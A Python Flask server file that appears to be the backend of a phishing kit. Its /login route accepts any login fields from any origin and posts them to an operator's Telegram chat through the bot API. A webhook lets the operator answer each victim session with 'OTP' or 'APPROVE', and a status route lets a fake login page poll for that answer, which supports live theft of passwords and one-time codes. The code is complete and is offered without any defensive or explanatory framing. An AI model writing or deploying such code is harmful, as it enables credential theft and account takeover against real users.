from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import json
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)

@app.after_request
def after_request(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return response

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

SESSION_STATUS = {}

# ================= TELEGRAM =================
def send_to_telegram(data, session_id):
    msg = "🔐 LOGIN\n\n"
    for k, v in data.items():
        msg += f"{k}: {v}\n"
    msg += f"\nSESSION: {session_id}"

    keyboard = {
        "inline_keyboard": [
            [{"text": "OTP", "callback_data": f"{session_id}:otp"}],
            [{"text": "APPROVE", "callback_data": f"{session_id}:approved"}]
        ]
    }

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={
            "chat_id": CHAT_ID,
            "text": msg,
            "reply_markup": json.dumps(keyboard)
        }
    )

# ================= LOGIN =================
@app.route("/login", methods=["POST"])
def login():
    data = request.get_json() or {}

    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = "pending"

    send_to_telegram(data, session_id)

    return jsonify({
        "success": True,
        "id": session_id
    })

# ================= STATUS =================
@app.route("/status/<session_id>")
def status(session_id):
    status = SESSION_STATUS.get(session_id)

    if not status:
        return jsonify({"status": "invalid"})

    return jsonify({"status": status})

# ================= TELEGRAM WEBHOOK =================
@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()

    if "callback_query" in data:
        msg = data["callback_query"]["data"]

        try:
            session_id, action = msg.split(":")
            SESSION_STATUS[session_id] = action
            print("SET:", session_id, action)
        except:
            pass

    return jsonify({"ok": True})

# ================= ROOT =================
@app.route("/")
def home():
    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
